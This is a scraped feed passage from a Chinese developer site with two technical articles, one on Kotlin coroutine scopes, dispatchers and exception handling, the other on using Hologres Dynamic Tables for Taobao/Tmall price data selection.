100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>本期是协程的基础篇，会从协程作用域、上下文、启动模式等方面讲述如何去使用协程。并且，会基于协程提供的框架，封装工作中常用的基础能力。</p>
<h2 data-id="heading-1">二、协程作用域</h2>
<p>初学协程的时候，就听说过挂起函数必须在另一个挂起函数中或者协程作用域中才能被调用。那么，协程作用域是什么？如何创建一个协程作用域？</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    GlobalScope.launch { }
}

<span class="hljs-keyword">object</span> GlobalScope : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}
</code></pre>
<p>实现了 CoroutineScope 的类，创建该类的对象，就会得到一个协程作用域。</p>
<p>GlobalScope 是协程框架提供的一个全局作用域，由于它是静态的，因此它的生命周期一直持续到应用程序终止。在Android领域中，Google 提供一个一系列具有生命周期感知的 CoroutineScope。</p>
<ol>
<li>LifecycleScope：能监听页面的生命周期，在页面销毁的时候，取消协程</li>
<li>ViewModelScope：能够和 ViewModel 绑定，在 ViewModel 销毁的时候取消协程</li>
<li>MainScope：作用在主线程的协程作用域能够在这里进行 UI 的更新</li>
</ol>
<h2 data-id="heading-2">三、协程上下文</h2>
<p>协程上下文是一系列的实现了 Element 的集合，包括了 Job、CoroutineExceptionHandler、Dispatchers等。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CoroutineContext = Job() + CoroutineName(<span class="hljs-string">""</span>) + CoroutineExceptionHandler { coroutineContext, throwable -&gt; } + Dispatchers.IO
</code></pre>
<p>另外，协程上下文也是可以进行自定义的，只需要继承 Element 就可以了，示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserCoroutineContext</span>(<span class="hljs-keyword">val</span> id: String) : CoroutineContext.Element {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key = KEY

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> KEY : CoroutineContext.Key&lt;UserCoroutineContext&gt;
}
</code></pre>
<h2 data-id="heading-3">四、协程启动模式</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineStart</span> {
    DEFAULT,
    LAZY,
    <span class="hljs-meta">@ExperimentalCoroutinesApi</span> <span class="hljs-comment">// Since 1.0.0, no ETA on stability</span>
    ATOMIC,
    UNDISPATCHED;
}
</code></pre>
<p>我们通常用 <strong>DEFAULT</strong> 和 <strong>LAZY</strong> 的场景比较多，这四种启动模式的很好理解，解释如下：</p>
<ol>
<li>DEFAULT：默认的启动模式，协程创建完成之后就开始调度</li>
<li>LAZY：懒加载模式，例如 async 之后不直接启动，而是在 await 之后才开始调度</li>
<li>ATOMIC：启动之前不可取消</li>
<li>UNDISPATCHED：直接基于当前线程调用，直到遇到第一个挂起点，才会切换到 Dispatchers 指定的线程进行调度</li>
</ol>
<h2 data-id="heading-4">五、协程调度器</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">object</span> Dispatchers {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Default: CoroutineDispatcher = DefaultScheduler

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Main: MainCoroutineDispatcher <span class="hljs-keyword">get</span>() = MainDispatcherLoader.dispatcher

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Unconfined: CoroutineDispatcher = kotlinx.coroutines.Unconfined

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> IO: CoroutineDispatcher = DefaultIoScheduler
}
</code></pre>
<p>协程的调度方式分为 4 种，解释如下：</p>
<ol>
<li>Default：处理 CPU 密集型的任务</li>
<li>Main：主线程执行</li>
<li>Unconfined：不指定线程，直到遇到第一个挂起点，挂起恢复之后，切换到默认的线程</li>
<li>IO：IO 线程执行</li>
</ol>
<h2 data-id="heading-5">六、协程异常处理</h2>
<p>在一个协程作用域内，启动了多个协程，如果某个协程失败，那么其它的协程也会受到影响被取消，如下图实例：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c0b8eae961c420dbfbd3ba03bc17455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509581&amp;x-signature=j6j0eVG%2FdyAvDg5C%2FML0fcn8StM%3D" alt="image.png" loading="lazy"/></p>
<p>如果要让子协程之间不会相互影响，可以使用 <strong>SupervisorJob</strong>，示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        GlobalScope.launch {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob()) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"错误！！！！"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre>
<p>日志输出如下：</p>
<pre><code class="hljs language-swift" lang="swift">job1
job2
<span class="hljs-type">Exception</span> <span class="hljs-keyword">in</span> thread <span class="hljs-string">"DefaultDispatcher-worker-1"</span> java.lang.<span class="hljs-type">IllegalStateException</span>: 错误！！！！
	at com.xxxx.xxxx.xxxx.xxxxx.viewmodels.<span class="hljs-type">AKt</span><span class="hljs-variable">$main</span><span class="hljs-variable">$1</span><span class="hljs-variable">$1</span><span class="hljs-variable">$job1</span><span class="hljs-variable">$1</span>.invokeSuspend(<span class="hljs-type">A</span>.kt:<span class="hljs-number">42</span>)
</code></pre>
<p>job1 的失败不会影响 job2 的输出，但是应用程序依然会发生 Crash。SupervisorJob 能够阻止异常的传播，但是抛出的异常仍然需要被正确处理才行。示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        <span class="hljs-keyword">val</span> handle = CoroutineExceptionHandler { coroutineContext, throwable -&gt;
            println(throwable.message)
        }
        GlobalScope.launch(handle) {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob() ) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"错误！！！！"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hologres Dynamic Table在淘天价格力的业务实践]]></title>    <link>https://juejin.cn/post/7597243334176751656</link>    <guid>https://juejin.cn/post/7597243334176751656</guid>    <pubDate>2026-01-20T10:25:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597243334176751656" data-draft-id="7597024900521525300" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hologres Dynamic Table在淘天价格力的业务实践"/> <meta itemprop="keywords" content="大数据,人工智能"/> <meta itemprop="datePublished" content="2026-01-20T10:25:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云大数据AI技术"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hologres Dynamic Table在淘天价格力的业务实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云大数据AI技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:25:22.000Z" title="Tue Jan 20 2026 10:25:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>作者：</strong> 闵加坤 | 淘天集团价格平台开发工程师</p>
<h2 data-id="heading-0">业务介绍</h2>
<p>淘天价格力团队作为平台价格治理的核心部门，承载着淘宝天猫全域商品价格管理的重要职责。团队掌握着淘内外所有商品的全量价格信息，包括商品原价、券后价等多维度价格数据，每日增量数据规模达<strong>亿级</strong>以上。</p>
<p>在电商大促上下线时（如618、双11），<strong>价格变动</strong>频率会呈现数倍增长，这些海量数据不仅体量大，而且具有高时效性、强关联性和复杂变化特征。在<strong>大促常态化</strong>的现状下，行业运营急需高时效性的数据看板以便及时发现问题，并且需要商品维度、店铺维度等<strong>多维圈选</strong>能力，及时圈选出符合要求的数据并进行处理或分析。Hologres Dynamic Table完美契合业务需求。</p>
<h2 data-id="heading-1">Hologres Dynamic Table介绍</h2>
<p>视图是基于表的虚拟表，不存储数据只存储查询逻辑，每次访问时动态执行SQL，返回最新结果，主要帮助我们简化复杂查询。如果没有视图，那么对于以下查询，需要我们自己保存到一个地方，查询时执行完整SQL。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> total_sales 
<span class="hljs-keyword">FROM</span> orders 
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'completed'</span>;
</code></pre>
<p>如果有视图，我们可以把查询托管给视图，直接查询视图，可以简化使用。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建视图</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> sales_summary <span class="hljs-keyword">AS</span> 
<span class="hljs-keyword">SELECT</span> region, <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">as</span> total_sales 
<span class="hljs-keyword">FROM</span> orders 
<span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'completed'</span>;

<span class="hljs-comment">-- 查询视图</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sales_summary;
</code></pre>
<p>视图虽然帮我们管理了SQL的定义，但是复杂逻辑SQL的执行通常很<strong>耗费时间</strong>。将视图的查询结果实际<strong>保存</strong>下来就是<strong>物化视图</strong>。物化视图的结果需要<strong>定期更新</strong>以保证数据新鲜度。所以物化视图就是<strong>预定义SQL + 物化结果 + 周期更新</strong>。</p>
<p>Hologres Dynamic Table与物化视图类似，架构如下，提供全量刷新与增量刷新两种刷新模式。</p>
<p>全量刷新就是在周期到来时进行一次<strong>全量刷新覆盖</strong>，相当于Insert Overwrite。</p>
<p>增量刷新每次只处理<strong>增量数据</strong>，原理为在底层创建一个列存state表，存储中间状态（类似Flink state）。增量数据先以微批次方式做内存态聚合，再与state表合并，最后提交时以BulkLoad写入动态表。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c49117fc59c04516bab82e957b327f90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=OoO6F9bE%2BIfDFQvslZGOjPFS2qQ%3D" alt="" loading="lazy"/></p>
<p>在 Hologres <strong>V3.1</strong> 中 Dynamic Table 的能力如下。</p>
<p>备注</p>
<p>提供auto模式，若Query支持增量刷新则优先选择增量刷新，否则退化为全量刷新</p>
<p><strong>文档</strong></p>
<p>​<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fhologres%2Fuser-guide%2Fintroduction-to-dynamic-table%3Fspm%3Dholoweb.holoweb.console-base_help.dexternal.ef9227d8HCGGEY" target="_blank" title="https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base_help.dexternal.ef9227d8HCGGEY" ref="nofollow noopener noreferrer">​https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base\_help.dexternal.ef9227d8HCGGEY: https://help.aliyun.com/zh/hologres/user-guide/introduction-to-dynamic-table?spm=holoweb.holoweb.console-base\_help.dexternal.ef9227d8HCGGEY​</a>​</p>
<p>刷新模式</p>
<p>增量刷新</p>
<p>全量刷新</p>
<p><strong>技术实现</strong></p>
<p>微批次增量处理</p>
<p>INSERT OVERWRITE</p>
<p><strong>刷新触发</strong></p>
<p>定时/手动</p>
<p><strong>最小可配置间隔</strong></p>
<p>1分钟</p>
<p><strong>增量机制</strong></p>
<p>Binlog：处理CDC数据</p>
<p>Stream：文件级别处理增量数据，读取性能比Binlog高，但<strong>不稳定</strong>，暂不建议使用</p>
<p>无（全量）</p>
<p><strong>基表类型</strong></p>
<p>内表、动态表、Paimon外表</p>
<p>内表、动态表、Paimon外表、ODPS外表、DLF外表</p>
<p><strong>Join支持</strong></p>
<p>✅ 完整Join支持</p>
<p><strong>聚合函数</strong></p>
<p>✅ 支持</p>
<p>索引配置</p>
<p>✅ 支持</p>
<p>窗口函数</p>
<p>❌ 不支持</p>
<p>✅ 支持</p>
<p>IN子查询</p>
<p>❌ 不支持</p>
<p>✅ 支持</p>
<p>查询改写</p>
<p>❌ 不支持</p>
<p><strong>分区支持</strong></p>
<p>✅ 物理/逻辑分区</p>
<p><strong>分区刷新</strong></p>
<p>配置范围</p>
<p><strong>历史分区回刷</strong></p>
<p>✅ 手动回刷</p>
<p>计算资源</p>
<p>Local/Serverless</p>
<p>Serverless是实例资源上额外的资源，最大4096core，可为动态表设置可用core。Paimon暂不支持Serverless</p>
<p><strong>资源隔离</strong></p>
<p>实例资源/Serverless隔离</p>
<p><strong>Query变更：新增列、修改计算逻辑</strong></p>
<p>✅ 支持</p>
<p><strong>主要限制</strong></p>
<ul>
<li>
<p>不支持的场景：<br/>
窗口函数<br/>
IN子查询<br/>
EXISTS或NOTEXISTS<br/>
EXCEPT或INTERSECT<br/>
ORDERBY<br/>
LIMIT或OFFSET</p>
</li>
<li>
<p>Stream模式基表只能是列存表</p>
</li>
<li>
<p>若上游表为分区表，<strong>无法</strong>同时<strong>消费</strong>上游表的<strong>多个分区</strong>。</p>
</li>
<li>
<p>仅支持把刷新模式从增量改为全量，不支持从全量改为增量</p>
</li>
</ul>
<p>• 资源消耗大</p>
<h2 data-id="heading-2">业务实践</h2>
<h3 data-id="heading-3">数据圈选</h3>
<h4 data-id="heading-4">业务背景</h4>
<p>价格力团队需要为多个业务场景如商品价格回滚、全网比价等提供<strong>灵活的数据圈选能力</strong>，要求支持动态的指标组合和筛选条件配置。圈选集创建后，圈选结果也需要随底表数据的变化而变动，不同业务场景可接受的数据变化时间间隔也有所不同。</p>
<h4 data-id="heading-5">解决方案</h4>
<p>Dynamic Table完美符合场景要求：工程基于不同的筛选规则翻译成相应的DQL，并根据业务场景的需求灵活设置数据新鲜度等配置参数，最终生成完整的Dynamic Table DDL。</p>
<p><strong>指标系统：</strong> 指标系统中将<strong>表列</strong>配置为实体指标。业务指标提供高阶能力如级联指标、聚合、召回计算。</p>
<p><strong>筛选组件：</strong> 提供通用筛选配置组件，根据<strong>业务场景</strong>展示相应指标</p>
<p><strong>业务场景默认配置：Diamond中保存不同业务场景默认配置</strong>，包括刷新周期、刷新模式、默认召回条件、默认Join条件等</p>
<p><strong>DDL生成：</strong> 将筛选条件与默认条件通过<strong>DSL</strong>翻译为Hologres Dynamic Table DDL</p>
<p><strong>状态监控：</strong> 实现刷新状态检查机制，定期检查动态表刷新状态，区分<strong>未完成刷新</strong>和<strong>刷新后无数据</strong>两种情况</p>
<p><strong>数据供给：动态表第一次刷新完成后，提供Flink</strong>和<strong>分页查询</strong>两种数据供给方式。若选择Flink，在动态表创建完成后会自动根据默认条件创建Flink任务，通常把数据变更作为消息发送给MetaQ。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a52ab546667441728c0d63bb0a067cd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=h%2B2AJDYsX86DIRsgau1xhK15ScI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">应用效果</h4>
<p>该方案可在<strong>秒级</strong>从<strong>亿级</strong>数据基表中完成Dynamic Table创建及初次数据刷新，已在价格力团队多个业务场景中部署应用，显著提升了数据圈选的灵活性和效率。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d37e98895994bac9eaa113923fdfc09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=7XI1jHgiGALTgo2ZbvpSrGkSyaU%3D" alt="" loading="lazy"/></p>
